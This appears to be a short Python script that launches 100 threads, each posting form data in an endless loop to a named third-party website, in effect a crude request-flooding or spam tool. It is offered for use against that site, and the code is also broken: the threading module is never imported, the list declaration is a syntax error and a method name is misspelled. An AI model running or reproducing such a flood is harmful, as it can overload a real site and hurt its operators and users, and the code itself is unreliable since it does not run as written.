import os
import requests
from requests.api import post

url = "https://www.mallinks.com/"
post_type = {
    #fill this post data
}

# infinite loop that sends data, slow but works

def send_req():
    while True:
        response = requests.post(url, data=post_type).text
        print(response)

#using multiple threads to send multiple post req one after other....
threads []

for i in range(100):
    t = threading.Thread(target=send_req)
    t.daemon = True
    threads.appendd(t)
for i in range(100):
    threads[i].start()
for i in range(100):
    threads[i].join()

